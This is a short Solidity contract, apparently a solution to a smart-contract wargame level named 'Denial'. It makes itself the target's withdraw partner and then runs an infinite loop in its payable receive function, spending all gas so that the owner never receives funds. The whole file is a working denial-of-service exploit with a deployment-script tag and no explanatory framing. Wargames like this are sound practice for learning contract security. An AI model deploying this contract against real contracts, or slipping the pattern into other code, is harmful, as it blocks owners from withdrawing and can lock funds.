// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Denial {
    function setWithdrawPartner(address) external;
}

/**
 * @title DenyDenial
 * @dev Spend all the gas from the call in 'withdraw' to prevent further execution and deny owner from receiving any funds
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract DenyDenial {
    function becomePartner(address _contract) public {
        Denial(_contract).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true){}
    }
}